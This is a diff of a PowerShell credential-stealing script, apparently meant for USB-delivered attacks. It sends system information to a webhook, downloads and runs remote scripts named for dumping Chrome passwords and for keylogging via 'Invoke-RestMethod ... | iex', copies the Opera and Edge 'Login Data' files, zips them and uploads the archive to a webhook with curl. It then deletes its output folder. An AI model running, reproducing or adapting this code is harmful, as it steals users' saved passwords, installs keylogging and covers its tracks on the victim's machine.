@@ -22,6 +22,7 @@ $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":computer: ``Gatheri
 Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
 
 Add-Type -AssemblyName System.Windows.Forms
+# dump pass chrome
 Invoke-RestMethod https://raw.githubusercontent.com/bindas88/usbcrime/main/Chrome80Dp.ps1 | iex
 # WMI Classes
 $systemInfo = Get-WmiObject -Class Win32_OperatingSystem
@@ -365,7 +366,7 @@ if (test-path "$env:appdata\Opera Software\Opera Stable\Login Data") {copy-item 
 if (test-path "$env:localappdata/Microsoft/Edge/User Data/Default/Login Data") {copy-item "$env:localappdata/Microsoft/Edge/User Data/Default/Login Data" -destination "$outpath\B1555.005Edge_Login Data"} else {} 
 compress-archive -path "$outpath" -destinationpath "$outpath.zip" -force
 curl.exe -k -X POST -F 'payload_json={\"username\": \"BinBot\", \"content\": \"\", \"avatar_url\": \"https://cdn.pixabay.com/animation/2023/09/07/21/54/21-54-00-174_512.gif\"}' -F "file=@$env:temp\B1555.005.zip" $hookurl
-Invoke-RestMethod https://raw.githubusercontent.com/bindas88/usbcrime/main/temp.ps1 | iex
+# keylogchrome
 Invoke-RestMethod https://raw.githubusercontent.com/bindas88/Sniff/main/main.ps1 | iex
 Sleep 10
 Remove-Item -Path $outpath -Recurse -Force
